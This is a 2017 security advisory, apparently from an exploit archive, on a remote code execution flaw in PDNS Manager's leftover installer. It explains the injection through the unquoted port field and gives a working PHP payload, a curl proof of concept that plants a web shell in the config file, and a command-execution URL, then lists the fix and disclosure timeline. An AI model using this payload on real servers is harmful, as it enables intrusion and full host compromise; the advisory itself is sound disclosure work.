@@ -1,0 +1,222 @@
+id: 28083
+date: 07/05/2017
+title: PDNS Manager Remote Command Execution Vulnerability
+author: RedTeam
+cves: 
+
+Details
+=======
+
+Product: PDNS Manager
+Affected Versions: Git master 3bf4e28 (2016-12-12) - 2bb00ea (2017-05-22)
+Fixed Versions: <= v1.2.1, >= Git Commit ccc4232
+Vulnerability Type: Remote Command Execution
+Vendor URL: https://pdnsmanager.lmitsystems.de/
+Vendor Status: fixed version released
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+"PDNS Manager is a simple yet powerful administration tool for the
+Powerdns authoritative nameserver."
+"PNDS Manager was developed from scratch to achieve a user-friendly and
+pretty looking interface."
+(from project website) [0]
+
+
+More Details
+============
+
+PDNS Manager includes two files used for installation purposes,
+install.php and api/install.php. The documentation tells users to start
+the installation by navigating to install.php and filling out the form that is
+presented there to create a database connection and an admin account. When
+submitted, an HTTP POST request with the configuration data is sent to
+api/install.php. The data is first validated in api/install.php by using it to
+connect to the database:
+
+------------------------------------------------------------------------
+try {
+        $db = new PDO("$input->type:dbname=$input->database;host=$input->host;port=$input->port", $input->user, $input->password);
+}
+catch (PDOException $e) {
+    $retval['status'] = "error";
+    $retval['message'] = serialize($e);
+}
+------------------------------------------------------------------------
+
+As long as a valid database connection can be made with the data from
+the POST request, the installation process continues. The configuration is
+written to the file config/config-user.php which then gets included from
+config/config-default.php:
+
+------------------------------------------------------------------------
+$configFile = Array();
+
+$configFile[] = '<?php';
+$configFile[] = '$config[\'db_host\']=\''.addslashes($input->host)."';";
+$configFile[] = '$config[\'db_user\']=\''.addslashes($input->user)."';";
+$configFile[] = '$config[\'db_password\']= \''.addslashes($input->password)."';";
+$configFile[] = '$config[\'db_name\']=\''.addslashes($input->database)."';";
+$configFile[] = '$config[\'db_port\']='.addslashes($input->port).";";
+$configFile[] = '$config[\'db_type\']=\''.addslashes($input->type)."';";
+
+$retval['status'] = "success";
+try {
+    file_put_contents("../config/config-user.php", implode("\n", $configFile));
+}
+------------------------------------------------------------------------
+
+At the very beginning of install.php, it is checked whether the file
+config/config-user.php already exists. If this is the case, further
+execution of the installation process is aborted:
+
+------------------------------------------------------------------------
+if(file_exists("../config/config-user.php")) {
+    echo "Permission denied!";
+    exit();
+}
+------------------------------------------------------------------------
+
+However, the installation files are not removed and can therefore still
+be accessed. In consequence, attackers can (re-)run the installation
+process as long as the file config/config-user.php does not exist. This
+can be the case if either the installation routine was indeed not yet
+run, or the configuration details were added manually, e.g. by entering
+them directly into the file config/config-default.php.
+
+The provided configuration data is not verified for semantic or
+syntactic correctness in any way. Only the PHP function addslashes() is
+used for all inputs, to mask single quotes, double quotes and
+backslashes. While this prevents adding malicious input to the
+configuration values which are set in single quotes, the port, which is
+expected to be numeric, is not enclosed in single quotes, making it
+vulnerable to code injection. Therefore, an HTTP POST request with a
+manipulated port value like the following could be sent to the
+installer:
+
+------------------------------------------------------------------------
+POST /api/install.php HTTP/1.1
+Host: example.com
+[...]
+Connection: close
+
+{
+    "host":"attacker-system.example.com",
+    "user":"root",
+    "password":"secret",
+    "database":"pdnsdb",
+    "port":"3306;system($_GET[chr(99).chr(109).chr(100)])",
+    "userName":"administrator",
+    "userPassword":"password",
+    "type":"mysql"
+}
+------------------------------------------------------------------------
+
+To bypass the problem that the addslashes() function prevents the usage
+of single or double quotes for the GET variable name, it was instead
+encoded with the chr() function and decodes to the string "cmd".
+
+PDNS Manager since Git commit 3bf4e28[1] from 12 December 2016 uses the
+PHP PDO class for establishing a database connection. Since the PDO
+class is quite liberal in what it accepts in its Data Source Name
+parameter, the configuration parameters as shown above are accepted and
+allow for a valid database connection, as the additional data in the
+"port" parameter is ignored by the PDO class. Finally, the file
+config/config-user.php will be written with the following content:
+
+------------------------------------------------------------------------
+<?php
+$config['db_host'] = 'example.com';
+$config['db_user'] = 'root';
+$config['db_password'] = 'secret';
+$config['db_name'] = 'pdnsdb';
+$config['db_port'] = 3306;system($_GET[chr(99).chr(109).chr(100)]);
+$config['db_type'] = 'mysql';
+------------------------------------------------------------------------
+
+As config/config-user.php is a normal, executable PHP file, commands can
+now be executed on the affected system by requesting the following URL:
+
+------------------------------------------------------------------------
+http://example.com/config/config-user.php?cmd=uname%20-a
+------------------------------------------------------------------------
+
+
+Proof of Concept
+================
+
+1. Check if install.php is still available and can be used to write a new
+configuration by visiting the following URL:
+
+http://example.com/install.php
+
+2. Set up a database that PDNS Manager can connect to.
+
+3. Send an HTTP POST request with a manipulated "port" parameter, e.g.
+
+------------------------------------------------------------------------
+curl -H 'Content-Type: application/json' --data \
+'{"host":"attacker-system.example.com", \
+"user":"root", \
+"password":"secret", \
+"database":"pdnsdb", \
+"port":"3306;system($_GET[chr(99).chr(109).chr(100)])", \
+"userName":"administrator", \
+"userPassword":"password", \
+"type":"mysql"}' \
+http://example.com/api/install.php
+------------------------------------------------------------------------
+
+4. Run arbitrary commands:
+
+------------------------------------------------------------------------
+http://example.com/config/config-user.php?cmd=uname%20-a
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+Ensure that config/config-user.php exists.
+
+
+Fix
+===
+
+The problem was fixed in the Git master branch in commit ccc4232[2].
+Alternatively, the stable version v1.2.1 and earlier are not affected.
+
+
+Security Risk
+=============
+
+The vulnerability is deemed to be of medium risk. The number of
+installations that are configured in the way described should be rather
+low, as it is not the recommended way of installing PDNS Manager and the
+development version of PDNS Manager needs to have been used. However, if
+such a configuration is found, arbitrary PHP code can be run on the
+system. Depending on the system's configuration, this can lead to a full
+compromise of the host running PDNS Manager.
+
+
+Timeline
+========
+
+2017-05-16 Vulnerability identified
+2017-06-16 Customer approved disclosure to vendor
+2017-06-27 Vendor notified
+2017-06-29 Vendor released fixed version
+2017-07-05 Advisory released
+
+
+References
+==========
+
+[0] https://pdnsmanager.lmitsystems.de/
+[1] https://github.com/loewexy/pdnsmanager/commit/3bf4e2874a0120d99ae02a1a9f4a6e74094c7dc1
+[2] https://github.com/loewexy/pdnsmanager/commit/ccc423291cb0e6f8c58849f71821e7425b7c030e
+
+#  0day.today [2023-03-25]  #
